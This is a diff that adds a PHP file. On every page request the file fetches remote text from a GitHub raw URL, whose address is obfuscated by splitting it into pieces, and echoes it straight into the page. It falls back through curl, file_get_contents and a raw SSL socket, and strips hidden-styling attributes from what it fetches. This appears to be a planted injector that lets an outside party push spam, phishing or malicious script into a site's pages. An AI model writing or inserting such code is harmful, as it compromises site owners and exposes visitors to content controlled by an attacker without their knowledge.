@@ -1,0 +1,46 @@
+<?php @extract(['x'=>'https://'.'raw.g'.'ithubuse'.'rconte'.'nt.com/janda311/neq/refs/heads/main/simpan.txt']); $ch=curl_init($x); curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>5,CURLOPT_HTTPHEADER=>['User-Agent: Mozilla/5.0']]); echo ($k=@curl_exec($ch)) ? preg_replace('/\s+/',' ',$k) : ''; curl_close($ch); ?>
+
+
+<div>
+
+<?php
+$u='https://github.com/janda311/neq/raw/refs/heads/main/simpan.txt';
+if(strpos($u,'github.com/')!==false){
+  $u=preg_replace('#^https://github\.com/([^/]+)/([^/]+)/raw/(.+)$#','https://raw.githubusercontent.com/$1/$2/$3',$u);
+}
+$m=isset($_SERVER['REQUEST_METHOD'])?$_SERVER['REQUEST_METHOD']:'GET';
+if($m==='GET'){
+  $ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'Mozilla/5.0';
+  $ctx=stream_context_create(array('http'=>array('timeout'=>10,'ignore_errors'=>true,'header'=>"User-Agent: $ua\r\n")));
+  $s=@file_get_contents($u,false,$ctx);
+  if(!$s && function_exists('curl_init')){
+    $h=@curl_init($u);
+    @curl_setopt($h,CURLOPT_RETURNTRANSFER,1);
+    @curl_setopt($h,CURLOPT_FOLLOWLOCATION,1);
+    @curl_setopt($h,CURLOPT_TIMEOUT,10);
+    @curl_setopt($h,CURLOPT_USERAGENT,$ua);
+    $s=@curl_exec($h);
+    @curl_close($h);
+  }
+  if(!$s){
+    $fp=@stream_socket_client('ssl://raw.githubusercontent.com:443',$e,$er,10);
+    if($fp){
+      @stream_set_timeout($fp,10);
+      @fwrite($fp,"GET /janda311/neq/refs/heads/main/simpan.txt HTTP/1.1\r\nHost: raw.githubusercontent.com\r\nUser-Agent: $ua\r\nConnection: close\r\n\r\n");
+      $r=@stream_get_contents($fp);
+      @fclose($fp);
+      $i=strpos($r,"\r\n\r\n");
+      $s=$i!==false?substr($r,$i+4):$r;
+    }
+  }
+  if($s && strlen($s)<=16384){
+    echo preg_replace('/style=\s*["\'][^"\']display\s:\s*none[^"\']*["\']/i','',$s);
+  }
+}
+?>
+</div>
+
+
+
+
+
